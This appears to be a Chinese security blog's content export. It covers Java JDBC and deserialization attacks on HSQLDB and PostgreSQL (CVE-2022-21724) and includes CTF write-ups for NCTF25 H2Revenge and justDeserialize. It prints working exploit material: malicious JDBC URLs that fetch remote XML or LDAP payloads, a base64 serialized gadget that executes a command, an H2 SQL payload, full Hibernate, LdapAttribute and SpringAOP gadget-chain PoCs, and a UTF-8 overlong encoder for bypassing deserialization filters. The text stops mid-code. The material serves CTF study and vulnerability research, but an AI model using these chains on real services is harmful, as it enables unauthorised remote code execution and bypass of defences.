&quot;org.apache.commons.lang.SerializationUtils.deserialize&quot;(&quot;org.apache.logging.log4j.core.config.plugins.convert.Base64Converter.parseBase64Binary&quot;(&#x27;rO0A....&#x27;))\n\n下面记录一下可以用的二次反序列化函数。\nspring-core:org.springframework.util.ReflectUtils#defineClass\t字节码加载\norg.springframework.util.SerializationUtils.deserialize\t二次反序列化\n下面两个在5版本的hsql中测试失败，3、4版本的没测试：\nCALL org.hsqldb.util.ScriptTool.main\norg.hsqldb.lib.InOutUtil.deserialize\n另外，hsql还可以结合druid来扩大攻击面，实现jndi到jdbc攻击。这里面利用的是druid里的一个工厂类。利用这个工程类，能够实现高版本jndi+jdbc攻击。\n参考HSQLDB 安全测试指南 - 浅蓝 ‘s blog\nCVE-2022-41853 分析：通过 Java 反序列化和远程代码库攻击使用静态函数获取 RCE | CN-SEC 中文网\n关于hsqldb反序列化漏洞的一些思考-先知社区\n","categories":["Java安全"],"tags":["Java安全"]},{"title":"PostgreSql利用分析","url":"/2025/05/05/postgreSQL/","content":"前言PostgreSql主要有两个漏洞，一个是调用任意String或Properties的构造方法，常与ClassPathXml结合；另一个是修改日志路径实现写文件的漏洞，不过文件前后会有脏字符。\n这里简单分析一下两个漏洞并给出利用方法。\nCVE-2022-21724影响版本x&lt; 42.2.25\n42.3.0&lt;&#x3D;x&lt; 42.3.2\n本文选择42.3.0进行分析\n漏洞代码\njdbc连接最终会走到org.postgresql.util.ObjectFactory#instantiate\nClass.forName会加载静态代码。之后会先尝试获取单Properties参数的构造方法，没有的话，再尝试获取单String参数的构造方法。最后进行newInstance，调用相应的构造方法。\n单String构造方法中，最典型的应该就是ClassPathXmlApplicationContext了。\n源码分析从org.postgresql.Driver#connect开始：\n\n首先是要求url以jdbc:postgresql: 开头\n后面对url进行解析，一段一段看。\n\n先由 ? 划分urlServer和urlArgs。会再检查一遍是否以jdbc:postgresql: 开头。然后判断后面的部分是不是以&#x2F;&#x2F; 开头。然后判断urlServer部分，是不是以 &#x2F; 结尾。是的话，会开始解析host，port，dbname。其中host:port可以有多组，每组以逗号分开。同时，由下面的代码能看出：\n\n如果不以 &#x2F;&#x2F; 开头，则会添加默认的数据源，即localhost:5432：\n\n接下来开始解析参数部分，会对参数进行一次urldecode：\n\n综上，可以发现，? 前面的部分可以随便写，只要以 &#x2F; 结尾就行了。\n回到connect：\n\n这里的setupLog和后面的任意文件写入有关，后面会单独讲。\n之后跟进makeConnection，跟进PgConnection构造方法，再跟进openConnection：\n\n这里会取出参数中的protocolVersion，一般可以不写，要写的话，就只能写3\n跟进openConnectionImpl：\n\n这里跟进后，就会触发漏洞代码：\n\n如果不写socketFactory参数，就会设置为默认的工厂，进入下面的逻辑：\n\n大概就是遍历每一个serverUrl，分别调用tryConnect：\n\n在enableSSL方法中，根据目标的返回来进入不同的case，只有返回S的ascii码时，才能正常进入下一步：\n\nconvert方法中，也出现了getSocketFactory方法：\n\n\n同样是可以进入漏洞代码，只是args的名字需要换一下。\n除此之外，还有其他地方能够触发，同样是convert方法，跟进下面的verifyPeerName：\n\n\n不过这里就只能调用Properties的构造方法了。\n参考文章里还写了别的利用方式，可以自行阅读。\n利用方式su18师傅已经写的很好了，建议直接看他的，这里就搬运一下。\n[1] ClassPathXmlApplicationContext\n历史上最经典的利用，ClassPathXmlApplicationContext&#x2F;FileSystemXmlApplicationContext 通过远程执行 xml 出网来 RCE。需要依赖 spring-context-support。（或者其他自行封装包例如 weblogic 的 com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext 等）\n此种利用方式首先出现在 Jackson 的利用链 CVE-2017-17485 中，后作为单 String 构造方法被广泛利用。\njdbc:postgresql:///?socketFactory=org.springframework.context.support.ClassPathXmlApplicationContext&amp;socketFactoryArg=http://127.0.0.1:8000/poc.xml\n\n关于 ClassPathXmlApplicationContext 的更多利用细节将在后面进行描述。\n[2] FileOutputStream&#x2F;InputStream\nFileOutputStream 清空文件，实战中可以配合业务逻辑清空特定文件，达到 RCE 的目的。\njdbc:postgresql:///?socketFactory=java.io.FileOutputStream&amp;socketFactoryArg=/var/www/app/install.lck\n\n反过来 FileInputStream 可以探测文件是否存在，不过需要看到报错信息来判断。\n[3] JLabel\nCS RCE 的套娃，需要依赖 batik-swing（对 JDK 环境及版本也有要求）。\njdbc:postgresql:///?socketFactory=javax.swing.JLabel&amp;socketFactoryArg=&lt;html&gt;&lt;object classid=&quot;org.apache.batik.swing.JSVGCanvas&quot;&gt;&lt;param name=&quot;URI&quot; value=&quot;http://localhost:8080/1.xml&quot;&gt;&lt;/object&gt;&lt;/html&gt;\n\n\n\n[4] MiniAdmin\nMysql 的套娃。需要依赖 mysql-connector-java（这个类高版本才有）。\njdbc:postgresql:///?socketFactory=com.mysql.cj.jdbc.admin.MiniAdmin&amp;socketFactoryArg=jdbc:mysql://127.0.0.1:3306/test?...\n\n\n\n[5] IniEnvironment\n在 ActiveMQ 不出网利用中出现的类，可以配合 BCEL 加载以及反序列化，需要依赖 activemq-shiro 以及对应依赖。\n根据 Anchor 师傅在先知上发现的文章。有两条不出网的利用链，第一条是 BasicDataSource 配合 BCEL 类加载，需要的依赖和限制有点多，这里就不列举了。\n第二条是 ActiveMQObjectMessage#getObject 触发的反序列化\njdbc:postgresql:///?socketFactory=org.apache.activemq.shiro.env.IniEnvironment&amp;socketFactoryArg=%5Bmain%5D%0Abs%20%3D%20org.apache.activemq.util.ByteSequence%0Amessage%20%3D%20org.apache.activemq.command.ActiveMQObjectMessage%0Abs.data%20%3D%20rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZZTaMLT7P4KxAwACSQAEc2l6ZUwACmNvbXBhcmF0b3J0ABZMamF2YS91dGlsL0NvbXBhcmF0b3I7eHAAAAACc3IAK29yZy5hcGFjaGUuY29tbW9ucy5iZWFudXRpbHMuQmVhbkNvbXBhcmF0b3LjoYjqcyKkSAIAAkwACmNvbXBhcmF0b3JxAH4AAUwACHByb3BlcnR5dAASTGphdmEvbGFuZy9TdHJpbmc7eHBzcgA%2Fb3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmNvbXBhcmF0b3JzLkNvbXBhcmFibGVDb21wYXJhdG9y%2B%2FSZJbhusTcCAAB4cHQAEG91dHB1dFByb3BlcnRpZXN3BAAAAANzcgA6Y29tLnN1bi5vcmcuYXBhY2hlLnhhbGFuLmludGVybmFsLnhzbHRjLnRyYXguVGVtcGxhdGVzSW1wbAlXT8FurKszAwAGSQANX2luZGVudE51bWJlckkADl90cmFuc2xldEluZGV4WwAKX2J5dGVjb2Rlc3QAA1tbQlsABl9jbGFzc3QAEltMamF2YS9sYW5nL0NsYXNzO0wABV9uYW1lcQB%2BAARMABFfb3V0cHV0UHJvcGVydGllc3QAFkxqYXZhL3V0aWwvUHJvcGVydGllczt4cAAAAAAAAAAAdXIAA1tbQkv9GRVnZ9s3AgAAeHAAAAACdXIAAltCrPMX%2BAYIVOACAAB4cAAAAU3K%2Frq%2BAAAAMQAWAQA0b3JnL2FwYWNoZS93aWNrZXQvYmF0aWsvYnJpZGdlL1NWR0Jyb2tlbkxpbmtQcm92aWRlcgcAAQEAEGphdmEvbGFuZy9PYmplY3QHAAMBAAY8aW5pdD4BAAMoKVYBAARDb2RlDAAFAAYKAAQACAEAEWphdmEvbGFuZy9SdW50aW1lBwAKAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwwADAANCgALAA4BABZvcGVuIC1hIENhbGN1bGF0b3IuYXBwCAAQAQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwwAEgATCgALABQAIQACAAQAAAAAAAEAAQAFAAYAAQAHAAAAGgACAAEAAAAOKrcACbgADxIRtgAVV7EAAAAAAAB1cQB%2BABAAAAEayv66vgAAADQAEQEANW9yZy9hcGFjaGUvY29tbW9ucy9qYW0vcHJvdmlkZXIvSmFtU2VydmljZUZhY3RvcnlJbXBsBwABAQAQamF2YS9sYW5nL09iamVjdAcAAwEAClNvdXJjZUZpbGUBABpKYW1TZXJ2aWNlRmFjdG9yeUltcGwuamF2YQEAEHNlcmlhbFZlcnNpb25VSUQBAAFKBXHmae48bUcYAQANQ29uc3RhbnRWYWx1ZQEABjxpbml0PgEAAygpVgwADAANCgAEAA4BAARDb2RlACEAAgAEAAAAAQAaAAcACAABAAsAAAACAAkAAQABAAwADQABABAAAAARAAEAAQAAAAUqtwAPsQAAAAAAAQAFAAAAAgAGcHQAAWFwdwEAeHEAfgANeA%3D%3D%0Abs.length%20%3D%201628%0Abs.offset%20%3D%200%0Amessage.content%20%3D%20%24bs%0Amessage.trustAllPackages%20%3D%20true%0Amessage.object.x%20%3D%20x\n\n\n\n[6] HikariConfig\n柯字辈师傅分享，利用 Properties 方式，走 HikariConfig 触发 JNDI，需要依赖 HikariCP。\njdbc:postgresql:///?socketFactory=com.zaxxer.hikari.HikariConfi&amp;metricRegistry=ldap://127.0.0.1:1389/exp\n\n\n\n[其他] 开发代码\n除了上面常见依赖的代码，在一些产品中可能存在能够利用的方式。\n例如在 VMWare Workspace ONE Access RCE 中使用 com.vmware.licensecheck.LicenseChecker 二次反序列化来达到不出网利用。\n参考项目：https://github.com/sourceincite/hekate\n漏洞修复工厂类实例化时，加上了对预期类的判断。\n\n任意文件写入影响版本&lt;42.3.3\n漏洞代码org.postgresql.Driver#setupLoggerFromProperties中，会跟进URL中的参数进行日志设置，从而指定PARENT_LOGGER的日志等级和日志文件名称。\n\n这里的FileHandler的写入路径可以自己指定。\n\n最后会向PARENT_LOGGER中添加新的handler。\n\n紧接着就会对完整url进行日志记录，调用栈如下：\n\n最终会获取到刚刚写入的parentlogger\n\n不过，这样写入的文件前后会有脏字符，如下：\n\n参考Postgresql JDBC Attack and Stuff | 素十八\n","categories":["Java安全"],"tags":["Java安全"]},{"title":"NCTF25--H2Revenge","url":"/2025/05/06/NCTF25-H2Revenge/","content":"思路确定题目是jdk17环境，先看依赖：\n&lt;dependency&gt;    &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;    &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt;    &lt;version&gt;3.4.3&lt;/version&gt;&lt;/dependency&gt;&lt;dependency&gt;    &lt;groupId&gt;com.h2database&lt;/groupId&gt;    &lt;artifactId&gt;h2&lt;/artifactId&gt;    &lt;version&gt;2.3.232&lt;/version&gt;&lt;/dependency&gt;\n\n分析一下可用资源：\n1、springboot自带的jackson链\n2、h2可以打JDBC，能够自定义函数执行，或者直接用JavaScript引擎加载(这个方法在jdk17失效)\n3、有tomcat，但是版本比较高，10.1.36，在jndi时也许能用\n再看一下题目：\n1、从Dockerfile里可以看到，是jre17，而不是jdk17。这意味着我们无法编译代码\n2、反序列化入口明显，且没有任何过滤\n3、MyDataSource存在getConnection方法，且连接的url可控\n综上，能够大概确定思路：\n1、jackson触发MyDataSource的getConnection，然后打h2数据库\nh2 新打法一般来说，h2数据库要么用自定义函数执行，或者直接用JavaScript引擎加载。不过这两种这里都不能用。前者因为自定义的函数在jre环境下无法编译，后者是因为jdk17里JavaScript引擎被废除。因此我们需要找新的方法。\n如果做过其他jdk17打JDBC的题，就会发现：许多数据库都是可以直接调用Java的public static方法的。h2也不例外，这点可以去翻看官方文档https://h2database.com/html/features.html![img](image-1746531786413.png)\n或者去问AI验证一下：\n那么，我们现在就可以确定怎么打h2 JDBC了。不过我们还需要确定通过什么public static方法去打。\n看了wp，发现里面用的是org.springframework.cglib.core.ReflectUtils#newInstance(java.lang.Class, java.lang.Class[], java.lang.Object[])\nReflectUtils是Springboot自带的一个很好用的类，里面还有defineClass。\n另外，值得一提的还有org.springframework.util.SerializationUtils#deserialize，这个可以用来二次反序列化。\n后面新学了一个rce的方法，就是加载xml。就是通过org.springframework.context.support.ClassPathXmlApplicationContext的构造方法加载恶意xml文件\npackage solution;import org.springframework.context.support.ClassPathXmlApplicationContext;import java.lang.reflect.Constructor;public class ClassPathXml &#123;    public static void main(String[] args) throws Exception &#123;        Tools17.bypassModule(ClassPathXml.class);        ClassPathXmlApplicationContext context = new ClassPathXmlApplicationContext();        Class&lt;?&gt; aClass = Class.forName(context.getClass().getName(), false, context.getClassLoader());        Constructor&lt;?&gt; declaredConstructor = aClass.getDeclaredConstructor(String.class);        declaredConstructor.setAccessible(true);        declaredConstructor.newInstance(&quot;http://127.0.0.1:9990/1.xml&quot;);    &#125;&#125;&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;&lt;beans xmlns=&quot;http://www.springframework.org/schema/beans&quot;       xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;       xsi:schemaLocation=&quot;     http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd&quot;&gt;    &lt;bean id=&quot;pb&quot; class=&quot;java.lang.ProcessBuilder&quot; init-method=&quot;start&quot;&gt;        &lt;constructor-arg&gt;            &lt;list&gt;                &lt;value&gt;cmd&lt;/value&gt;                &lt;value&gt;/c&lt;/value&gt;                &lt;value&gt;calc&lt;/value&gt;            &lt;/list&gt;        &lt;/constructor-arg&gt;    &lt;/bean&gt;&lt;/beans&gt;\n\n直接在xml目录下起一个http服务就行。\n最后还需要编写一下poc.sql文件。这里也有一个注意点，先展示：\nCREATE ALIAS CLASS_FOR_NAME FOR &#x27;java.lang.Class.forName(java.lang.String)&#x27;;CREATE ALIAS NEW_INSTANCE FOR &#x27;org.springframework.cglib.core.ReflectUtils.newInstance(java.lang.Class, java.lang.Class[], java.lang.Object[])&#x27;;CREATE ALIAS UNESCAPE_VALUE FOR &#x27;javax.naming.ldap.Rdn.unescapeValue(java.lang.String)&#x27;;SET @url_str=&#x27;http://vps:port/h2_revenge_evil.xml&#x27;;SET @url_obj=UNESCAPE_VALUE(@url_str);SET @context_clazz=CLASS_FOR_NAME(&#x27;org.springframework.context.support.ClassPathXmlApplicationContext&#x27;);SET @string_clazz=CLASS_FOR_NAME(&#x27;java.lang.String&#x27;);CALL NEW_INSTANCE(@context_clazz, ARRAY[@string_clazz], ARRAY[@url_obj]);\n\n要注意的地方就是@url_str算varchar类型，而我们的newInstance里需要Object[]，所以需要找一个public static类，能够把String转为Object。（这里勘误一下，应该是Object转为String。因为最终需要的Object[]里面的内容是String，而现在需要将VERCHAR转为String。并且ARRAY[]只支持String。但是这样下面的查询语句就不对了，也就找不到wp里的那个类了，不知道有没有师傅知道应该怎么解释）用tabby找一下：\n搜出来的方法不是很多，排除掉没有exports的模块其实剩的就很少了。我们需要的javax.naming.ldap.Rdn.unescapeValue也在里面。\ntabby找新类（失败）这里我发现org.springframework.scripting.bsh.BshScriptUtils#createBshObject应该也行，给的输入是”new java.lang.Object[]{&quot;http://127.0.0.1/1.xml\\&quot;}&quot;就行。然而这个类本身有报错，说是包没导入：![img](image-1746531786459.png)\n我想既然spring里有这个类，那不应该自动下所需的包吗，不知道这里为什么。\n后面又去试了一下createBshObject，发现可能不行。虽然能返回Object[]，但是h2sql转化不了，会报类型转化错误，不知道有没有师傅可以解决。\n最后觉得应该是必须用 sql 语句自带的 ARRAY 转成 Object 数组，而不能直接传一个 Object[]。然后上面那个缺失包的情况，其实还挺常见的，就是在需要用时，自己把包导入。所以这题就没法用这个新找的链子了。自己找链子又失败了，悲。\n","categories":["CTF-Java"],"tags":["CTF-Java"]},{"title":"软件安全赛半决赛--justDeserialize","url":"/2025/05/08/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E8%B5%9B%E5%8D%8A%E5%86%B3%E8%B5%9B-justDeserialize/","content":"依赖：springboot是2.7.0\n&lt;dependency&gt;    &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;    &lt;artifactId&gt;spring-boot-starter-data-jpa&lt;/artifactId&gt;&lt;/dependency&gt;&lt;dependency&gt;    &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;    &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt;&lt;/dependency&gt;&lt;dependency&gt;    &lt;groupId&gt;org.hsqldb&lt;/groupId&gt;    &lt;artifactId&gt;hsqldb&lt;/artifactId&gt;    &lt;version&gt;2.4.1&lt;/version&gt;&lt;/dependency&gt;&lt;dependency&gt;    &lt;groupId&gt;com.alibaba&lt;/groupId&gt;    &lt;artifactId&gt;druid-spring-boot-starter&lt;/artifactId&gt;    &lt;version&gt;1.2.8&lt;/version&gt;&lt;/dependency&gt;\n\n\n\n题目是jdk11，我这里用jdk11.0.26\n先分析可用资源：\n\nhsqldb是内存型数据库，很可能可以通过call的方式实现方法调用\ndruid是个数据库连接池，它可以在jndi中，通过本地工厂类的方式，将jndi转化成jdbc，即能够控制数据库连接时的参数，并在连接前执行任意查询语句\nspringboot-jpa里带hibernate，aspectjweaver，springaop依赖\njdk11里，模块化特性还没强制生效。虽然没有exports的包还是没法直接用，但是可以在jdk8下编译，得到的payload直接去打jdk11的服务也行\n\n再看题目：\n\n反序列化点很直接，不过有两次过滤\n第一次过滤基于字符串匹配，能够直接通过UTF8 Overlong绕过\n第二次是resolveClass，只能想办法绕过黑名单，这个黑名单主要禁的是readObject—&gt;toString\n\nhiberate链这里通过触发org.hibernate.engine.spi.TypedValue#hashCode，最终实现任意getter方法调用，即hibernate链\n可以触发com.sun.rowset.JdbcRowSetImpl#getParameterMetaData，然后jndi\n也可以触发com.sun.jndi.ldap.LdapAttribute#getAttributeDefinition，然后jndi\n不过这里HashMap被ban，所以需要使用HashTable来触发hashCode\n我这里jdk11.0.26，trustcodebase和trustserialdata都默认为false，所以不能通过传统的方式打jndi。这里直接使用java-chain工具生成ldap服务器：\n之后就是DruidDataSourceFactory到hsql的jdbc attack了\nhsql是能够调用任意public static方法的，所以这里选org.springframework.util.ReflectionUtils.defineClass来加载字节码。\nPoc：要在jdk8下生成，jdk11里JdbcRowSetImpl没有exports\npackage com.example.ezjav.solution;import com.example.ezjav.utils.MyObjectInputStream;import com.sun.rowset.JdbcRowSetImpl;import org.hibernate.engine.spi.TypedValue;import org.hibernate.property.access.spi.Getter;import org.hibernate.property.access.spi.GetterMethodImpl;import org.hibernate.tuple.component.PojoComponentTuplizer;import org.hibernate.type.ComponentType;import java.io.ByteArrayInputStream;import java.io.ByteArrayOutputStream;import java.io.FileOutputStream;import java.lang.reflect.Field;import java.util.Base64;import java.util.Hashtable;public class Poc &#123;    public static void main(String[] args) throws Exception &#123;        JdbcRowSetImpl jdbcRowSet = new JdbcRowSetImpl();        jdbcRowSet.setDataSourceName(&quot;ldap://127.0.0.1:50389/77e2e4&quot;);        GetterMethodImpl getterMethod = new GetterMethodImpl(JdbcRowSetImpl.class, &quot;databaseMetaData&quot;, jdbcRowSet.getClass().getDeclaredMethod(&quot;getDatabaseMetaData&quot;));        PojoComponentTuplizer o = (PojoComponentTuplizer) Tools.getObjectByUnsafe(PojoComponentTuplizer.class);        Tools.setFieldValue(o, &quot;getters&quot;, new Getter[]&#123;getterMethod&#125;);        ComponentType o1 = (ComponentType) Tools.getObjectByUnsafe(ComponentType.class);        Tools.setFieldValue(o1, &quot;componentTuplizer&quot;, o);        Tools.setFieldValue(o1, &quot;propertySpan&quot;, 1);        TypedValue typedValue = new TypedValue(o1, jdbcRowSet);//        typedValue.hashCode();        Hashtable&lt;Object, Object&gt; hashtable = new Hashtable&lt;&gt;();        hashtable.put(&quot;1&quot;, &quot;2&quot;);        Field tableField = Hashtable.class.getDeclaredField(&quot;table&quot;);        tableField.setAccessible(true);        Object[] table = (Object[]) tableField.get(hashtable);        for (Object entry: table)&#123;//            System.out.println(entry);            if (entry != null)&#123;                Tools.setFieldValue(entry,&quot;key&quot;,typedValue);            &#125;        &#125;        ByteArrayOutputStream baos = new ByteArrayOutputStream();        CustomObjectOutputStream oos = new CustomObjectOutputStream(baos);        oos.writeObject(hashtable);        oos.close();        String s = Base64.getEncoder().encodeToString(baos.toByteArray());        Base64.getDecoder().decode(s);        new FileOutputStream(&quot;D://1tmp//payload.txt&quot;).write(s.getBytes());        ByteArrayInputStream bais = new ByteArrayInputStream(baos.toByteArray());        new MyObjectInputStream(bais).readObject();    &#125;&#125;\n\n\n\nLdapAttribute链触发getter的方式跟上面一样，都用hibernate链\npublic static BasicAttribute getGadgetObj()&#123;    try&#123;        Class clazz = Class.forName(&quot;com.sun.jndi.ldap.LdapAttribute&quot;);        Constructor clazz_cons = clazz.getDeclaredConstructor(new Class[]&#123;String.class&#125;);        clazz_cons.setAccessible(true);        BasicAttribute la = (BasicAttribute)clazz_cons.newInstance(new Object[]&#123;&quot;exp&quot;&#125;);        Field bcu_fi = clazz.getDeclaredField(&quot;baseCtxURL&quot;);        bcu_fi.setAccessible(true);        bcu_fi.set(la, &quot;ldap://127.0.0.1:1389/&quot;);        CompositeName cn = new CompositeName();        cn.add(&quot;a&quot;);        cn.add(&quot;b&quot;);        Field rdn_fi = clazz.getDeclaredField(&quot;rdn&quot;);        rdn_fi.setAccessible(true);        rdn_fi.set(la, cn);        return la;    &#125;catch (Exception e)&#123;        e.printStackTrace();    &#125;    return null;&#125;\n\n\n\nSpringAOP新链能触发任意方法。根据接口类型，所需要的启动方式也不一样，比如这里用toString启动。如果再套一层Comparator接口，那就可以用Compare启动。\npackage com.example.ezjav.solution;import com.sun.rowset.JdbcRowSetImpl;import org.aopalliance.aop.Advice;import org.springframework.aop.aspectj.AspectJAroundAdvice;import org.springframework.aop.aspectj.AspectJExpressionPointcut;import org.springframework.aop.aspectj.SingletonAspectInstanceFactory;import org.springframework.aop.framework.ProxyFactory;import java.lang.reflect.InvocationHandler;import java.lang.reflect.Method;import java.lang.reflect.Proxy;import java.util.Comparator;public class Poc02 &#123;    public static void main(String[] args) throws Exception &#123;        JdbcRowSetImpl jdbcRowSet = new JdbcRowSetImpl();        jdbcRowSet.setDataSourceName(&quot;ldap://127.0.0.1:50389/99b8ce&quot;);        Method declaredMethod = jdbcRowSet.getClass().getDeclaredMethod(&quot;getDatabaseMetaData&quot;);//        Person person = new Person();//        Method declaredMethod = Person.class.getDeclaredMethod(&quot;getName&quot;);        AspectJExpressionPointcut pointcut = new AspectJExpressionPointcut();        SingletonAspectInstanceFactory instanceFactory = new SingletonAspectInstanceFactory(jdbcRowSet);        AspectJAroundAdvice aspectJAroundAdvice = new AspectJAroundAdvice(declaredMethod, pointcut, instanceFactory);        ProxyFactory proxyFactory = new ProxyFactory(jdbcRowSet);        proxyFactory.addAdvice(aspectJAroundAdvice);        Object proxy = proxyFactory.getProxy();        proxy.toString();        //        Object o = Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), new Class[]&#123;Comparator.class&#125;,(InvocationHandler) proxy);//        o.compare(&quot;aaa&quot;, &quot;bbb&quot;);            &#125;&#125;\n\n\n\n参考软件攻防赛现场赛上对justDeserialize攻击的几次尝试 | GSBP’s Blog\n软件系统安全赛2025华东赛区半决赛wp-web - Potat0w0\nhttps://github.com/vulhub/java-chains/\n微信公众平台 Springaop新链\n分析尝试利用tabby挖掘-SpringAOP链 - Potat0w0 SpringAOP新链简化版\nJava反序列化之Hibernate - Potat0w0 hibernate链\t\t注意大于5版本和小于5版本的利用方式不同\nhibernate1利用链分析 | 藏青’s BLOG\nUTF 8 Overlong 工具类package com.example.ezjav.solution;import java.io.*;import java.lang.reflect.Field;import java.lang.reflect.InvocationTargetException;import java.lang.reflect.Method;import java.util.HashMap;public class CustomObjectOutputStream extends ObjectOutputStream &#123;    private static HashMap&lt;Character, int[]&gt; map;    static &#123;        map = new HashMap&lt;&gt;();        map.put(&#x27;.&#x27;, new int[]&#123;0xc0, 0xae&#125;);        map.put(&#x27;;&#x27;, new int[]&#123;0xc0, 0xbb&#125;);        map.put(&#x27;$&#x27;, new int[]&#123;0xc0, 0xa4&#125;);        map.put(&#x27;[&#x27;, new int[]&#123;0xc1, 0x9b&#125;);        map.put(&#x27;]&#x27;, new int[]&#123;0xc1, 0x9d&#125;);        map.put(&#x27;a&#x27;, new int[]&#123;0xc1, 0xa1&#125;);        map.put(&#x27;b&#x27;, new int[]&#123;0xc1, 0xa2&#125;);        map.put(&#x27;c&#x27;, new int[]&#123;0xc1, 0xa3&#125;);        map.put(&#x27;d&#x27;, new int[]&#123;0xc1, 0xa4&#125;);        map.put(&#x27;e&#x27;, new int[]&#123;0xc1, 0xa5&#125;);        map.put(&#x27;f&#x27;, new int[]&#123;0xc1, 0xa6&#125;);        map.put(&#x27;g&#x27;, new int[]&#123;0xc1, 0xa7&#125;);        map.put(&#x27;h&#x27;, new int[]&#123;0xc1, 0xa8&#125;);        map.put(&#x27;i&#x27;, new int[]&#123;0xc1, 0xa9&#125;);        map.put(&#x27;j&#x27;, new int[]&#123;0xc1, 0xaa&#125;);        map.put(&#x27;k&#x27;, new int[]&#123;0xc1, 0xab&#125;);        map.put(&#x27;l&#x27;, new int[]&#123;0xc1, 0xac&#125;);        map.put(&#x27;m&#x27;, new int[]&#123;0xc1, 0xad&#125;);        map.put(&#x27;n&#x27;, new int[]&#123;0xc1, 0xae&#125;);        map.put(&#x27;o&#x27;, new int[]&#123;0xc1, 0xaf&#125;); // 0x6f        map.put(&#x27;p&#x27;, new int[]&#123;0xc1, 0xb0&#125;);        map.put(&#x27;q&#x27;, new int[]&#123;0xc1, 0xb1&#125;);        map.put(&#x27;r&#x27;, new int[]&#123;0xc1, 0xb2&#125;);        map.put(&#x27;s&#x27;, new int[]&#123;0xc1, 0xb3&#125;);        map.put(&#x27;t&#x27;, new int[]&#123;0xc1, 0xb4&#125;);        map.put(&#x27;u&#x27;, new int[]&#123;0xc1, 0xb5&#125;);        map.put(&#x27;v&#x27;, new int[]&#123;0xc1, 0xb6&#125;);        map.put(&#x27;w&#x27;, new int[]&#123;0xc1, 0xb7&#125;);        map.put(&#x27;x&#x27;, new int[]&#123;0xc1, 0xb8&#125;);        map.put(&#x27;y&#x27;, new int[]&#123;0xc1, 0xb9&#125;);        map.put(&#x27;z&#x27;, new int[]&#123;0xc1, 0xba&#125;);        map.put(&#x27;A&#x27;, new int[]&#123;0xc1, 0x81&#125;);        map.put(&#x27;B&#x27;, new int[]&#123;0xc1, 0x82&#125;);        map.put(&#x27;C&#x27;, new int[]&#123;0xc1, 0x83&#125;);        map.put(&#x27;D&#x27;, new int[]&#123;0xc1, 0x84&#125;);        map.put(&#x27;E&#x27;, new int[]&#123;0xc1, 0x85&#125;);        map.put(&#x27;F&#x27;, new int[]&#123;0xc1, 0x86&#125;);        map.put(&#x27;G&#x27;, new int[]&#123;0xc1, 0x87&#125;);        map.put(&#x27;H&#x27;, new int[]&#123;0xc1, 0x88&#125;);        map.put(&#x27;I&#x27;, new int[]&#123;0xc1, 0x89&#125;);        map.put(&#x27;J&#x27;, new int[]&#123;0xc1, 0x8a&#125;);        map.put(&#x27;K&#x27;, new int[]&#123;0xc1, 0x8b&#125;);        map.put(&#x27;L&#x27;, new int[]&#123;0xc1, 0x8c&#125;);        map.put(&#x27;M&#x27;, new int[]&#123;0xc1, 0x8d&#125;);        map.put(&#x27;N&#x27;, new int[]&#123;0xc1, 0x8e&#125;);        map.put(&#x27;O&#x27;, new int[]&#123;0xc1, 0x8f&#125;);        map.put(&#x27;P&#x27;, new int[]&#123;0xc1, 0x90&#125;);        map.put(&#x27;Q&#x27;, new int[]&#123;0xc1, 0x91&#125;);        map.put(&#x27;R&#x27;, new int[]&#123;0xc1, 0x92&#125;);        map.put(&#x27;S&#x27;, new int[]&#123;0xc1, 0x93&#125;);        map.put(&#x27;T&#x27;, new int[]&#123;0xc1, 0x94&#125;);        map.put(&#x27;U&#x27;, new int[]&#123;0xc1, 0x95&#125;);        map.put(&#x27;V&#x27;, new int[]&#123;0xc1, 0x96&#125;);        map.put(&#x27;W&#x27;, new int[]&#123;0xc1, 0x97&#125;);        map.put(&#x27;X&#x27;, new int[]&#123;0xc1, 0x98&#125;);        map.put(&#x27;Y&#x27;, new int[]&#123;0xc1, 0x99&#125;);        map.put(&#x27;Z&#x27;, new int[]&#123;0xc1, 0x9a&#125;);    &#125;    public CustomObjectOutputStream(OutputStream out) throws IOException &#123;        super(out);    &#125;    @Override    protected void writeClassDescriptor(ObjectStreamClass desc) throws            IOException &#123;        String name = desc.getName();//        writeUTF(desc.getName());        writeShort(name.length() * 2);        for (int i = 0; i &lt; name.length(); i++) &#123;            char s = name.charAt(i);            //            System.out.println(s);            write(map.get(s)[0]);            write(map.get(s)[1]);        &#125;        writeLong(desc.getSerialVersionUID());        try &#123;            byte flags = 0;            if ((boolean)getFieldValue(desc,&quot;externalizable&quot;)) &#123;                flags |= ObjectStreamConstants.SC_EXTERNALIZABLE;                Field protocolField =                        ObjectOutputStream.class.getDeclaredField(&quot;protocol&quot;);                protocolField.setAccessible(true);                int protocol = (int) protocolField.get(this);                if (protocol != ObjectStreamConstants.PROTOCOL_VERSION_1) &#123;                    flags |= ObjectStreamConstants.SC_BLOCK_DATA;                &#125;            &#125; else if ((boolean)getFieldValue(desc,&quot;serializable&quot;))&#123;                flags |= ObjectStreamConstants.SC_SERIALIZABLE;            &#125;            if ((boolean)getFieldValue(desc,&quot;hasWriteObjectData&quot;)) &#123;                flags |= ObjectStreamConstants.SC_WRITE_METHOD;            &#125;            if ((boolean)getFieldValue(desc,&quot;isEnum&quot;) ) &#123;                flags |= ObjectStreamConstants.SC_ENUM;            &#125;            writeByte(flags);            ObjectStreamField[] fields = (ObjectStreamField[])                    getFieldValue(desc,&quot;fields&quot;);            writeShort(fields.length);            for (int i = 0; i &lt; fields.length; i++) &#123;                ObjectStreamField f = fields[i];                writeByte(f.getTypeCode());                writeUTF(f.getName());                if (!f.isPrimitive()) &#123;                    Method writeTypeString =                            